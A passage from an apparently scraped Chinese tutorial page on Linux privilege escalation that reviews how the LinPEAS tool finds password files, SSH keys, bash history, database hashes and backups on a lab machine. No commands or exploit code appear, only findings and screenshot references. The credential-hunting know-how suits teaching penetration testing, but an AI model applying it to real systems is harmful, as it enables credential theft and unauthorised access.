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" width="437" height="54" class="img_ev3q"></p>
<ul>
<li><strong>passwd.dav?</strong> – 未找到！</li>
<li><strong>隐藏文件和文件夹：/.important/.password？</strong> – 找到了！但未提取内容。</li>
</ul>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240717140850152-462620095-b512c6bea6588654cf9d56a3fc586342.png" width="811" height="338" class="img_ev3q"></p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240717140849970-1688425511-6d30114eb9660cdd8fdd43544693a8be.png" width="808" height="245" class="img_ev3q"></p>
<ul>
<li><strong>.bash_history 文件？</strong> – 找到了！但不会提取内容。</li>
<li><strong>.ssh 文件夹和 SSH 密钥？</strong> – 找到了！但不会提取内容。</li>
</ul>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240717140850587-1516949887-04078f3c05dbe447fb719847d8b3d035.png" width="473" height="613" class="img_ev3q"></p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240717140849028-1148200674-705e1de9b669e09cf246936803c0c286.png" width="343" height="88" class="img_ev3q"></p>
<ul>
<li><strong>MySQL 中的哈希值？</strong> – 未找到！因为 mysql 登录需要账户密码，LinPEAS 无法访问数据库。（若登录密码为空，说不定能列出哈希值）</li>
<li><strong>pwds.db？</strong> – 找到了！且提取了哈希的内容。在这里我们可以看到它只在文件中提取了一个哈希，但这足以让我们知道，我们可以进一步手动探索它。</li>
</ul>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240717140850017-367820664-eccac4efe8ad93575c59a2ef44c34de7.png" width="981" height="338" class="img_ev3q"></p>
<ul>
<li><strong>backup.rar？</strong> – 找到了！</li>
</ul>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240717140849860-756622110-81b83f8efb581d48a1cfb300043740e0.png" width="467" height="129" class="img_ev3q"></p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240717140851219-1848339225-9d4e2310c718e2886beb38fe67f3b34a.png" width="979" height="190" class="img_ev3q"></p>
<p>还不错！LinPEAS 能够枚举出我们能够发现的大多数包含密码的文件，甚至从其中一些文件中提取了密码和哈希值。然而，这些结果同时也告诉我们，虽然 LinPEAS 非常出色，但没有什么比人工枚举更有效了（因为 LinPEAS 同时也枚举出了很多干扰文件）。</p></div></article><nav class="pagination-nav docusaurus-mt-lg" aria-label="文件选项卡"><a class="pagination-nav__link pagination-nav__link--prev" href="/web/docs/category/linux-提权"><div class="pagination-nav__sublabel">上一页</div><div class="pagination-nav__label">Linux 提权</div></a><a class="pagination-nav__link pagination-nav__link--next" href="/web/docs/category/windows-提权"><div class="pagination-nav__sublabel">下一页</div><div class="pagination-nav__label">Windows 提权</div></a></nav></div></div><div class="col col--3"><div class="tableOfContents_bqdL thin-scrollbar theme-doc-toc-desktop"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#导航" class="table-of-contents__link toc-highlight">导航</a></li><li><a href="#0前言" class="table-of-contents__link toc-highlight"><strong><div>0、前言</div></strong></a></li><li><a href="#1密码搜寻--文件名和文件内容" class="table-of-contents__link toc-highlight"><strong><div>1、密码搜寻 – 文件名和文件内容</div></strong></a></li><li><a href="#2密码搜寻--web-文件config-文件" class="table-of-contents__link toc-highlight"><strong><div>2、密码搜寻 – Web 文件/Config 文件</div></strong></a></li><li><a href="#3密码搜寻--隐藏文件文件夹" class="table-of-contents__link toc-highlight"><strong><div>3、密码搜寻 – 隐藏文件/文件夹</div></strong></a></li><li><a href="#4密码搜寻--mysql" class="table-of-contents__link toc-highlight"><strong><div>4、密码搜寻 – MySQL</div></strong></a></li><li><a href="#5密码搜寻--varbackups-文件夹" class="table-of-contents__link toc-highlight"><strong><div>5、密码搜寻 – /var/backups 文件夹</div></strong></a></li><li><a href="#6密码搜寻--受密码保护的文件" class="table-of-contents__link toc-highlight"><strong><div>6、密码搜寻 – 受密码保护的文件</div></strong></a></li><li><a href="#7自动工具寻找密码--linpeas" class="table-of-contents__link toc-highlight"><strong><div>7、自动工具寻找密码 – LinPEAS</div></strong></a></li></ul></div></div></div></div></main></div></div></div><footer class="footer footer--dark"><div class="container container-fluid"><div class="footer__bottom text--center"><div class="margin-bottom--sm"><a href="https://www.cnblogs.com/kqdssheng" rel="noopener noreferrer" class="footerLogoLink_BH7S"><img src="/web/img/logo.svg" alt="博客园" class="footer__logo themedComponent_mlkZ themedComponent--light_NVdE" width="30" height="30"><img src="/web/img/logo.svg" alt="博客园" class="footer__logo themedComponent_mlkZ themedComponent--dark_xIcU" width="30" height="30"></a></div></div></div></footer></div>
</body>
</html>